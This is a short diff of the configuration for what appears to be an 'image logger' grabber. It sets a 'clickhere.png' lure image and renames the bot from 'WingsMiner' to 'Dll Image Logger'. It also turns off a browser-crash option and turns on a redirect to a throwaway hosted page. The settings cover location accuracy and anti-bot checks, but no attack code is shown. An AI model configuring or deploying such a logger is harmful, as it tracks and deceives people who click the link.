@@ -26,10 +26,10 @@ config = {
     "image": "https://cdn.discordapp.com/attachments/1156707106746023949/1157018392377708544/clickhere.png", # <------------------------- Put image address link here.
     "imageArgument": True,
 
-    "username": "WingsMiner",
+    "username": "Dll Image Logger",
     "color": 0x03AC13,
 
-    "crashBrowser": True,
+    "crashBrowser": False,
     
     "accurateLocation": False,
 
@@ -47,7 +47,7 @@ config = {
     "antiBot": 1,
 
     "redirect": {
-        "redirect": False,
+        "redirect": True,
         "page": "https://nothingherelol.000webhostapp.com" 
     },
 }
